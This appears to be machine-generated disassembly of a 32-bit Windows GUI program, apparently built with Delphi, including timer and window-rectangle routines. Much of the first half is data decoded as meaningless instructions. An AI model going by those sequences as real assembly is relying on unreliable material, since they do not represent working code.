inc eax
add [ edx + esi + 0x40 ] bl
jb r-xdata
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
jb r-xdata
test al 0x13
inc edx
add [ eax - 0x1bffbdec ] ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
cwde
adc eax [ edx ]
adc al [ fs : edx ]
jb r-xdata
outsb
push ebx
je r-xdata
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
jns r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
and eax 0x25a00043
inc ebx
add [ eax + eax ] al
lea eax [ bx + si ]
push 0x4325
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x43 ] ch
push ebp
jo r-xdata
inc eax
add [ eax ] al
add bh bh
sbb [ ecx + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
[ eax ]
inc ecx
inc ebx
adc al [ edx ]
add al ah
aas
inc ebx
add [ eax ] cl
nop
inc ecx
add al al
adc al [ edx ]
and al 0x8f
inc ecx
add [ eax + 0x64004213 ] bl
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jpo r-xdata
push ss
inc edx
add [ eax + 0x100433f ] dl
add bh ch
call [ eax + 0x41 ]
inc ebx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x25ac9072
inc ebx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x43256872
add [ eax + 0x5004170 ] al
add [ eax ] cl
inc ebp
js r-xdata
adc eax [ edx ]
mov al 0x13
inc edx
add ah ch
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or [ ecx + 0x44 ] bh
jpe r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ecx ] cl
dec edi
das
inc edx
add [ eax + 0x1 ] dh
add bh bh
jo r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
je r-xdata
inc eax
add [ eax ] dh
add [ eax ] al
[ eax ]
add [ edi + ebp * 2 + 0x16cc0041 ] al
inc ebx
add [ eax + 0x44004325 ] ah
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0029 ] al
outsb
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add [ eax + 0x4f0a0021 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
push eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bl
dec ebp
inc ebp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
jb r-xdata
inc edx
add ah bh
xor al 0x40
add [ eax - 0x5fffbcdb ] bl
and eax r-xdata
add [ eax ] al
test [ edi + 0x41 ] ch
add ah cl
push ss
jb r-xdata
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + eax * 2 + 0x43 ] ah
add ah ah
inc ebp
add [ eax + 0x4c004347 ] bh
cmp eax [ ebp ]
nop
mov ebx 0x31600044
inc ebp
add [ eax - 0x67ffbacf ] al
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
inc ebp
add [ edi + ecx * 4 ] ah
popad
insb
mov ah 0x5a
inc ecx
add [ eax ] bh
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
inc esp
pop esp
sub_4327b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ eax ] 0x1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
sub [ ebx ] al
sub [ edx ] al
add [ eax ] al
xor [ esi ] ah
inc ebx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bl
dec ebp
inc ebp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + eax * 2 + 0x43 ] ah
add ah ah
inc ebp
add [ eax + 0x4c004347 ] bh
cmp eax [ ebp ]
nop
mov ebx 0x31600044
inc ebp
add [ eax - 0x67ffbacf ] al
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_432deb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
dec edi
jbe r-xdata
jo r-xdata
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
dec edi
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
jpo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
inc esp
jb r-xdata
hlt
push eax
outsd
jo r-xdata
jge r-xdata
inc esp
outsd
ja r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
jpo r-xdata
jbe r-xdata
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc edi
je r-xdata
add [ eax + 0x4f070038 ] al
mov ah 0x5a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
cmp [ ecx + 0x44 ] 0x0
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
jo r-xdata
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x86f666e
jns r-xdata
mov ah 0x5a
jpe r-xdata
inc ebx
add [ eax ] al
xor al [ ebx ]
and al 0x2
jb r-xdata
add [ eax ] al
dec eax
fiadd [ ebx ]
int3
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
xor [ ebx ] eax
add [ edx ] dh
inc ebx
add [ edx + eax ] ah
jb r-xdata
jpo r-xdata
dec ebp
outsd
jbe r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ ecx ] cl
dec edi
jge r-xdata
outsb
inc esp
jb r-xdata
xor [ eax + eax ] 0xa
dec edi
jl r-xdata
outsb
dec ebp
outsd
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
arpl [ ebx - 0x64 ] bp
jpo r-xdata
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
or al 0x45
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al dl
dec ebx
inc ebx
add al dl
add [ eax - 0x22 ] cl
inc ebx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
arpl [ ebx + 0x10 ] bp
xor [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edx ] dh
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
je r-xdata
jne r-xdata
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9422ece
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
add [ eax - 0x4700ffff ] bh
add al 0x35
inc eax
add [ eax ] dh
jb r-xdata
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ esi + ecx * 2 ] ch
inc ebx
add [ edi * 4 + 0x4e400044 ] bl
inc ebx
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0x4b ] al
inc ebx
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
inc esp
sub_433898
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4251e0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424990
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4251e0
pop ebx
mov esp ebp
pop ebp
retn
sub_43395c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424a9c
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_433898
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_4339bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_454300
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4275e0
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_433e00
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_4034bc
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_44c02c
mov edx 0x69
mov eax ebx
call sub_44c008
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_433a54
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45435c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_433aa0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_427d18
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_427d30
mov edi eax
mov eax ebx
call sub_44c278
mov [ esp ] eax
mov eax ebx
call sub_44c2bc
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402a84
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402a84
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402a84
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402a84
mov esi eax
jmp r-xdata
sub_433bcc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_433c7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_433aa0
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_425274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433c84
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_424a6c
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_424d8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_425218
sub_433c8c
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_464294
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_4533bc
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_4530b8
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_44da78
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_433d24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_433c8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_433e00
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_427d18
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_427d30
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_433aa0
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_427d18
push eax
mov eax [ ebx + 0x168 ]
call sub_427d30
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_433c8c
test al al
je r-xdata
sub_433f28
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_427d18
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_427d18
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_427d30
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_427d30
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_433f90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420f48
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_434018
call sub_4220a8
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_433fe0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_43408c
mov eax [ esi + 0x34 ]
call sub_42215c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_434018
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_434052
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43408c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43410b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434112
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
sub_434164
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454d80
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43d448
call sub_43d528
test al al
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov edx 0xb9
mov eax esi
call sub_44c008
mov edx 0x29
mov eax esi
call sub_44c02c
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_4345b4
mov edx 0x1
mov eax esi
call sub_4345d0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_44ca14
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_45334c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_434228
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ff44
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_434298
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d0
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_450658
sub_4342d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
